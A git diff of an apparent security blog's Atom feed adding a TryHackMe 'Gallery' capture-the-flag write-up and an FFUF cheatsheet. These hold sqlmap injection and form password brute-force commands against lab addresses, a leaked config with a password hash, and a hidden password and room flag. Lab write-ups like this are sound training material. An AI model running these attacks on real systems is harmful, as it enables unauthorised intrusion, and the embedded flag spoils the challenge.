@@ -4,13 +4,136 @@
  <title>0xbeven - Blog Site</title>
  <link href="https://beven.co.zw/atom.xml" rel="self"/>
  <link href="https://beven.co.zw/"/>
- <updated>2021-07-26T18:16:39+02:00</updated>
+ <updated>2022-02-25T16:23:51+02:00</updated>
  <id>https://beven.co.zw</id>
  <author>
    <name>Beven Nyamande</name>
    <email>wasp00007@gmail.com</email>
  </author>
 
+ 
+ <entry>
+   <title>THM Room - Gallery</title>
+   <link href="https://beven.co.zw/2022/02/25/thmroom-gallery"/>
+   <updated>2022-02-25T00:00:00+02:00</updated>
+   <id>https://beven.co.zw/2022/02/25/THMRoom-Gallery</id>
+   <content type="html">&lt;p&gt;ROOM: &lt;a href=&quot;https://tryhackme.com/room/gallery666&quot;&gt;Gallery&lt;/a&gt;&lt;/p&gt;
+
+&lt;h1 id=&quot;nmap-scan&quot;&gt;Nmap Scan&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PORT     STATE SERVICE VERSION
+80/tcp   open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+|_http-title: Apache2 Ubuntu Default Page: It works
+8080/tcp open  http    Apache httpd 2.4.29 &lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt;
+|_http-server-header: Apache/2.4.29 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+| http-open-proxy: Potentially OPEN proxy.
+|_Methods supported:CONNECTION
+|_http-title: Simple Image Gallery System
+| http-cookie-flags: 
+|   /: 
+|     PHPSESSID: 
+|_      httponly flag not &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;interesting-findings-&quot;&gt;Interesting findings ?&lt;/h1&gt;
+&lt;ul&gt;
+  &lt;li&gt;Port 80800 interesting and Running Simple Image Gallery System&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;whats-next--bruteforce-directories-and-remember-to-check-the-source-code-failed&quot;&gt;Whats next : bruteforce directories and remember to check the source code: FAILED&lt;/h2&gt;
+
+&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- /.social-auth-links --&amp;gt;&lt;/span&gt;
+
+      &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- &amp;lt;p class=&quot;mb-1&quot;&amp;gt;
+        &amp;lt;a href=&quot;forgot-password.html&quot;&amp;gt;I forgot my password&amp;lt;/a&amp;gt;
+      &amp;lt;/p&amp;gt; --&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;whats-next--sqlmap-the-login-page-failed&quot;&gt;Whats next : sqlmap the login page: FAILED&lt;/h2&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+└─&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;sqlmap &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.52.84/gallery/login.php &lt;span class=&quot;nt&quot;&gt;--form&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--batch&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--tamper&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;between &lt;span class=&quot;nt&quot;&gt;--risk&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3 &lt;span class=&quot;nt&quot;&gt;--level&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;3
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;check-the-exploit-db-for-the-cms-name-there-is-an-rce&quot;&gt;Check the Exploit-Db for the CMS name there is an RCE&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;a href=&quot;https://www.exploit-db.com/exploits/50214&quot;&gt;check here&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+&amp;lt;?php
+&lt;span class=&quot;nv&quot;&gt;$dev_data&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; array&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'id'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'-1'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'firstname'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Developer'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'lastname'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'username'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'dev_oretnom'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'password'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'5da283a2d990e8d8512cf967df5bc0d0'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'last_login'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'date_updated'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'date_added'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;defined&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'base_url'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'base_url'&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;http://&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$_SERVER&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'SERVER_ADDR'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/gallery/&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;defined&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'base_app'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'base_app'&lt;/span&gt;, str_replace&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'\\'&lt;/span&gt;,&lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt;,__DIR__&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.&lt;span class=&quot;s1&quot;&gt;'/'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;defined&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'dev_data'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'dev_data'&lt;/span&gt;,&lt;span class=&quot;nv&quot;&gt;$dev_data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;defined&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_SERVER'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_SERVER'&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;localhost&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;defined&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USERNAME'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_USERNAME'&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;XXXXX&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;defined&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_PASSWORD'&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;XXXXX&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(!&lt;/span&gt;defined&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; define&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'DB_NAME'&lt;/span&gt;,&lt;span class=&quot;s2&quot;&gt;&quot;gallery_db&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;ul&gt;
+  &lt;li&gt;Login to the mysql database&lt;/li&gt;
+  &lt;li&gt;Get the admin hash&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;check-varbackup&quot;&gt;Check /var/backup&lt;/h2&gt;
+&lt;ul&gt;
+  &lt;li&gt;Login as mike&lt;/li&gt;
+  &lt;li&gt;Pwn the box
+&lt;!--- b3stpassw0rdbr0xx --&gt;
+&lt;!--- THM{af05cd30bfed67849befd546ef} --&gt;&lt;/li&gt;
+&lt;/ul&gt;
+</content>
+ </entry>
+ 
+ <entry>
+   <title>FFUF cheatsheet</title>
+   <link href="https://beven.co.zw/2021/06/30/ffuf"/>
+   <updated>2021-06-30T00:00:00+02:00</updated>
+   <id>https://beven.co.zw/2021/06/30/FFUF</id>
+   <content type="html">&lt;h1 id=&quot;proxying-with-ffuf&quot;&gt;Proxying with ffuf&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.95.12/ &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/common.txt &lt;span class=&quot;nt&quot;&gt;-replay-proxy&lt;/span&gt; http://127.0.0.1:8080
+
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;filter-file-search-using-regex-ffuf&quot;&gt;Filter file search using regex ffuf&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.95.12/FUZZ &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt &lt;span class=&quot;nt&quot;&gt;-fr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'/\..*'&lt;/span&gt;
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;h1 id=&quot;subdomain-enumeration&quot;&gt;Subdomain Enumeration&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://FUZZ.mydomain.com &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&quot;nt&quot;&gt;-fs&lt;/span&gt; 0
+ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://mydomain.com &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Host: FUZZ.mydomain.com'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fs&lt;/span&gt; 0
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;generating-numbers-in-terminal&quot;&gt;Generating numbers in terminal&lt;/h1&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ruby &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'(0..255).each{|i| puts i}'&lt;/span&gt; | ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; - &lt;span class=&quot;nt&quot;&gt;-fw&lt;/span&gt; 33
+ruby &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'puts (0..255).to_a'&lt;/span&gt; | ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; - &lt;span class=&quot;nt&quot;&gt;-fw&lt;/span&gt; 33
+&lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;0..255&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt; | ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; - &lt;span class=&quot;nt&quot;&gt;-fw&lt;/span&gt; 33
+&lt;span class=&quot;nb&quot;&gt;seq &lt;/span&gt;0 255 | ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; - &lt;span class=&quot;nt&quot;&gt;-fw&lt;/span&gt; 33
+cook &lt;span class=&quot;s1&quot;&gt;'[0-255]'&lt;/span&gt; | ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'http://MACHINE_IP/sqli-labs/Less-1/?id=FUZZ'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; - &lt;span class=&quot;nt&quot;&gt;-fw&lt;/span&gt; 33
+
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;form-based-password-attacks-using-ffuf&quot;&gt;Form based password attacks using ffuf&lt;/h1&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
+ffuf &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.95.12/sqli-labs/Less-11/ &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/seclists/Passwords/Leaked-Databases/hak5.txt &lt;span class=&quot;nt&quot;&gt;-X&lt;/span&gt; POST &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'uname=Dummy&amp;amp;passwd=FUZZ&amp;amp;submit=Submit'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-fs&lt;/span&gt; 1435 &lt;span class=&quot;nt&quot;&gt;-H&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Content-Type: application/x-www-form-urlencoded'&lt;/span&gt; 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+</content>
+ </entry>
  
  <entry>
    <title>Setting Tor website</title>
@@ -195,7 +318,7 @@ dev.robyns-petshop.thm&lt;/p&gt;
 &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;    &lt;span class=&quot;n&quot;&gt;Request&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;http&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;methods&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;o&quot;&gt;|&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;Supported&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Methods&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;POST&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;OPTIONS&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;service&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unrecognized&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;despite&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;returning&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;If&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;know&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;please&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;following&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cgi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cgi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;service&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
+&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;service&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;unrecognized&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;despite&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;returning&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;If&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;you&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;know&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;service&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;version&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;please&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;following&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fingerprint&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;at&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;https&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;//&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;nmap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;org&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cgi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;bin&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;submit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;cgi&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;new&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;service&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;SF&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Port8000&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TCP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;V&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;91&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;I&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;Time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6085&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;D11F&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;P&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;x86_64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pc&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;linux&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;gnu&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;%&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Ge&lt;/span&gt;
